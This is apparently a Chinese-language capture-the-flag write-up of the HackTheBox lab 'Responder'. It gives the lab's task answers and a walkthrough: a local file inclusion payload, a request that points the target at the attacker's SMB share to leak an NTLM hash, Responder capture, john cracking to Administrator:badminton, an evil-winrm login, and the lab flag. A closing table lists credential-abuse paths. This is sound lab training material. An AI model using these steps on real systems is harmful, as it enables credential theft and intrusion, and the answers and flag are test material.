---
title: Responder
category:
  - 打靶
  - HTB
  - NTLM
  - 域渗透
  - AI+
tags:
  - NetNTLMv2哈希捕获
---
[[toc]]
## 参考资料 && 参考WP
- [HTB本题官方WP](blob:https://app.hackthebox.com/fb6f76ac-6b92-4b06-96e7-b4af6f871522)
- [博客园 - 域内三大协议](https://www.cnblogs.com/starrys/p/17140075.html)
- [Github - 64k star 2.3GB大的字典项目 -> SecLists](https://github.com/danielmiessler/SecLists)
- [Vaadata - NTLM身份认证与NTLM relay攻击（基于DNS和SMB）](https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/)
- [Gosecure - 基于PyRDP的NetNTLMv2哈希捕获 —— 技术细节与操作指南](https://gosecure.ai/blog/2022/01/17/capturing-rdp-netntlmv2-hashes-attack-details-and-a-technical-how-to-guide/)

***
## Tasks
### Task1 当使用靶机IP访问web服务时，我们被重定向到了什么域名
```
unika.htb
```
![](assets/Pasted%20image%2020250710211923.png)
### Task2 服务端用来渲染页面的语言是什么
```
php
```
三个字母，猜一下PHP
### Task3 页面使用什么查询参数来控制加载不同语言的文本
```
page
```
### Task4
下面哪一个是LFI（本地文件包含）的Payload：
- `french.html`
- `//10.10.14.6/somefile` （SMB共享路径）
- `../../../../../../../../windows/system32/drivers/etc/hosts` √
- `minikatz.exe` 

```plain
../../../../../../../../windows/system32/drivers/etc/hosts
```
### Task5 
下面哪一个是RFI（远程文件包含）的Payload

看答案格式猜出来的
```plain
//10.10.14.6/somefile
```
### Task6 NTLM的全称是什么
```plain
New Technology LAN Manager
```

>NTLM是NT LAN [Manager](https://baike.baidu.com/item/Manager/1607239?fromModule=lemma_inlink)的缩写，这也说明了协议的来源。NTLM是指 [telnet](https://baike.baidu.com/item/telnet/810597?fromModule=lemma_inlink) 的一种验证身份方式，即问询/应答[身份验证](https://baike.baidu.com/item/%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/2193233?fromModule=lemma_inlink)协议，是 Windows NT 早期版本的标准安全协议，[Windows 2000](https://baike.baidu.com/item/Windows%202000/2769068?fromModule=lemma_inlink) 支持 NTLM 是为了保持[向后兼容](https://baike.baidu.com/item/%E5%90%91%E5%90%8E%E5%85%BC%E5%AE%B9/94553?fromModule=lemma_inlink)。Windows 2000内置三种基本安全协议之一。 [1]来自[*百度百科*](https://baike.baidu.com/item/NTLM/6371298)

### Task7 `Responder`工具中用于指定网络接口的参数是什么 （捕获NTLM哈希）
>Which flag do we use in the Responder utility to specify the network interface?
```
-i
```

这里给出的用于完成**NTLM哈希凭据捕获**的工具包就叫`reponder`（[点我进入git仓库页面](https://github.com/lgandx/Responder)）
![](assets/Pasted%20image%2020250921114007.png)
kali也预装了这个工具包，位于`/usr/share/responder`目录中
查看`Responder.conf`文件确认配置，在这题中需要确保`SMB=On`：
![](assets/Pasted%20image%2020250921115226.png)
然后使用`Python3`启动工具：（在Kali中工具已经配置好环境路径，可以直接`Responder -I`启动）
```sh
└─# python3 Responder.py -I
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd
```
HTB的靶机网络位于本机的`tun0`虚拟隧道接口上
```sh
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.7  netmask 255.255.254.0  destination 10.10.16.7
        inet6 dead:beef:4::1005  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::9f6b:ded8:53b5:e955  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 3  bytes 252 (252.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 684 (684.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
因此需要指定监听的网络接口为`tun0`
```sh
└─# responder -I tun0 -w -d
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] ...

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.7]
    Responder IPv6             [dead:beef:4::1005]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-CBML1S3U2O8]
    Responder Domain Name      [O7VG.LOCAL]
    Responder DCE-RPC Port     [47911]

[+] Listening for events...

```
然后在浏览器中触发SMB校验：
```
http://unika.htb?page=//10.10.16.7/somefile
```
(我的火狐一直抽风，只能用`curl`访问)
![](assets/Pasted%20image%2020250921124402.png)
一般来说会直接在终端里打印出来，但如果之前捕获过的话就只会往`logs`里记

完事导入`john`爆破
![](assets/Pasted%20image%2020250921125054.png)
```
Administrator:badminton
```



### Task8 （john爆破哈希）
`john`是常用的数个用于爆破**NetNTLMv2**的工具之一，但……`john`的全称是什么
```plain
John the Ripper password cracker
```

```sh
┌──(root㉿kali)-[/usr/share/responder/logs]
└─# john -w=/usr/share/wordlists/rockyou.txt 10.129.42.55.hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-09-21 00:50) 12.50g/s 51200p/s 51200c/s 51200C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

![](assets/Pasted%20image%2020250710222345.png)
### Task9 `adminitrator`的口令是什么
```
badminton
```
### Task10
我们准备使用爆破得到的弱口令访问**Responder**靶机，请问这个服务在什么端口上监听
```
5985
```

![](assets/Pasted%20image%2020250921134808.png)
## 打靶
这把不能盲猜了，得真扫了
```shell
└─# nmap -p- -T5 -sC -sV -A 10.129.117.4 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-10 09:13 EDT
Stats: 0:03:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 86.03% done; ETC: 09:17 (0:00:30 remaining)
Nmap scan report for 10.129.117.4
Host is up (0.0030s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesnot have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (98%), VMware Player virtual NAT device (98%), Microsoft Windows XP SP3 (96%), DD-WRT v24-sp2 (Linux 2.4.37) (94%), Actiontec MI424WR-GEN3I WAP (92%), Linux 4.4 (91%), Linux 3.2 (90%), DVTel DVT-9540DW network camera (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.21 ms 192.168.100.2
2   0.25 ms 10.129.117.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 254.50 seconds

```

```
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open  tcpwrapped
```
注意`5985`端口的服务，这是我们稍后会用到的Windows Remote Management服务

![](assets/Pasted%20image%2020250710212503.png)
这对吗？

看了一下WP，原来是因为**Virtual Host**的锅——Virtual Host使得一台服务器可以配置多个域名
所以访问主IP时会被解析到某个虚拟域名，而直接访问这个虚拟域名时又会因为本地DNS服务器没有记录导致域名解析失败

给Kali补个域名配置先
```shell
echo "<IP地址> unika.htb" >> /etc/hosts
```

```shell
echo "10.129.117.4 unika.htb" >> /etc/hosts
```

给Windows也补一个
```
C:\Windows\System32\drivers\etc\hosts
```

嘶……怎么上不去呢
![](assets/Pasted%20image%2020250710223335.png)
yakit和cURL都能正确解析URL
![](assets/Pasted%20image%2020250710223444.png)
点击语言选项确实有反应，虽说得换种方法加载出来
![](assets/Pasted%20image%2020250710223601.png)
`page`参数确实是控制页面语言的，并且是链接到了静态资源目录下的一个`.html`文件
考虑到我的浏览器无法解析域名，我全程都只能使用工具排查`page`参数的文件包含漏洞是否可用

![](assets/Pasted%20image%2020250710225924.png)
是windows系统的话……
![](assets/Pasted%20image%2020250710230505.png)
```shell
curl "http://unika.htb?page=../../Windows/System32/drivers/etc/hosts"
```
本地文件包含漏洞确认
![](assets/Pasted%20image%2020250710233442.png)
`http://`协议被禁用，但`file://`协议可以使用
![](assets/Pasted%20image%2020250710233808.png)
（这里触发SMB校验不需要有效路径）

`curl`访问SMB共享路径，`reponder -I tun0`监听
![](assets/Pasted%20image%2020250921124402.png)
一般来说会直接在终端里打印出来，但如果之前捕获过的话就只会往`logs`里记

完事导入`john`爆破
![](assets/Pasted%20image%2020250921125054.png)
```
Administrator:badminton
```

最后使用[**Evil-WinRM**](https://github.com/Hackplayers/evil-winrm)连接靶机
```sh
evil-winrm -i 10.129.42.55 -u administrator -p badminton
```
:::tip
WinRM (Windows Remote Management) 是微软官方推荐的、用于对Windows系统进行远程管理和脚本执行的现代框架。它本质上就是Windows的“SSH”。它天生就是用来接受管理员凭证并提供一个远程命令行（PowerShell）接口的。
:::

:::info
![](assets/Pasted%20image%2020250921134549.png)
:::
连上去之后是Powershell……临时查点指令用用：
```powerhshell
# 搜索文件
Get-ChildItem -Path C:\ -Include *FileName* -File -Recurse -ErrorAction SilentlyContinue
# 查看文件
Get-Content -Path "C:\Path\To\Your\File.txt"
```
![](assets/Pasted%20image%2020250921135451.png)
![](assets/Pasted%20image%2020250921135537.png)

```
ea81b7afddd03efaa0945333ed147fac
```

![](assets/Pasted%20image%2020250921135605.png)
## 思路整理
1. 尝试HTTP访问靶机，发现被重定向到域名`unika.htb`
2. 探索页面时发现`page`参数被用于控制页面国际化文档，进一步测试发现`page`为RFI sink点
3. 尝试NTLM哈希捕获，浏览器或`curl`访问`http://unika.htb?page=//<攻击机IP>/<任意文件路径>`触发SMB校验，靶机将会向局域网段广播NTLM认证请求
4. 攻击机的`responder`工具指定监听OpenVPN网络接口（默认是`tun0`），捕获NTLM认证请求，并通过`challenge`过程获取NTLM哈希，输出到终端或日志中（如果之前已经捕获过同样来源的NTLM哈希）
5. `john`爆破NTLM哈希，获得靶机的口令
6. 使用`Evil-WinRM`登录靶机，get到Powershell（靶机没有开启SMB服务，所以`smbclient`连不上去）
7. 搜索并查看flag

:::tip 来自官方 - PHP页面上的RFI点
`php.ini`默认关闭`allow_url_include`，但即使`allow_url_include`和`allow_url_fopen`都为`Off`，也不影响PHP页面加载SMB路径
:::
:::tip 来自官方 - 
Kali或者说Linux没有Powershell套具，所以需要**Evil-WinRM**获取靶机的Powershell连接
:::
:::info 其他可以使用Windows口令登录的微软服务
以下是一些在Windows环境中，可以用系统级账户（本地用户或域用户）的口令进行登录的常见服务、它们的默认端口，以及在渗透测试中的意义。

---

**核心远程管理服务 (通常能直接获取Shell)**

这些是最高价值的目标，一旦登录成功，通常意味着直接拿下了系统的控制权。

| 服务名称 | 默认端口 | 协议 | 常用工具 | 描述与用途 |
| :--- | :--- | :--- | :--- | :--- |
| **WinRM** (Windows Remote Management) | **5985/tcp** (HTTP)<br>**5986/tcp** (HTTPS) | WS-Management | `Evil-WinRM`, `Winrs.exe` | **现代Windows远程管理的首选**。提供一个功能完整的PowerShell远程会话。防火墙友好，隐蔽性较好。 |
| **SMB** (Server Message Block) | **445/tcp** | SMB | `psexec`, `smbexec`, `wmiexec` (Impacket), `smbclient` | **Windows网络的核心**。不仅用于文件共享，更是许多远程执行工具的基础。`PsExec`等工具通过SMB上传并执行服务，从而获得系统级Shell。 |
| **RDP** (Remote Desktop Protocol) | **3389/tcp** | RDP | `xfreerdp`, `rdesktop` | **图形化远程桌面**。如果拿到管理员或远程桌面组成员的凭证，就可以直接登录到图形界面，操作就像在本地一样。 |
| **SSH** (Secure Shell) | **22/tcp** | SSH | `ssh` | 在现代Windows (Server 2019 / Windows 10之后) 中越来越普及。如果目标开启了OpenSSH服务，你可以像登录Linux一样获得一个命令行Shell。 |

---

**应用与数据层服务 (可能导致代码执行)**

这些服务本身不直接提供操作系统Shell，但如果用高权限账户登录，往往可以通过服务的功能间接实现远程代码执行 (RCE)。

| 服务名称 | 默认端口 | 协议 | 常用工具 | 描述与用途 |
| :--- | :--- | :--- | :--- | :--- |
| **MSSQL** (Microsoft SQL Server) | **1433/tcp** | TDS | `impacket-mssqlclient`, `sqsh` | 数据库服务。如果配置为“Windows身份验证”模式，就可以用系统账户登录。如果登录的账户权限够高 (如`sysadmin`角色)，通常可以通过`xp_cmdshell`存储过程来执行任意系统命令。 |
| **IIS** (Internet Information Services) | 80/tcp, 443/tcp | HTTP/S | 浏览器, `curl` | Web服务器。如果存在一个需要Windows身份验证才能访问的管理后台或文件上传功能，就可以用凭证登录。登录后上传一个Webshell是常见的提权路径。 |
| **FTP** (File Transfer Protocol) | **21/tcp** | FTP | `ftp` | 文件传输服务。如果配置为使用系统账户进行认证，你可以登录并上传/下载文件。可以利用它上传一个反向Shell的可执行文件，再想办法触发它。 |

---

**遗留服务 (不常见但极为脆弱)**

这些服务现在已经很少见，但一旦在内网中碰到，通常意味着巨大的安全风险。

| 服务名称 | 默认端口 | 协议 | 常用工具 | 描述与用途 |
| :--- | :--- | :--- | :--- | :--- |
| **Telnet** | **23/tcp** | Telnet | `telnet` | **极其古老的远程命令行**。所有通信（包括密码）都是明文传输，安全性极差。如果开放，基本等同于一个未加密的Shell入口。 |
:::

***
## 页面底部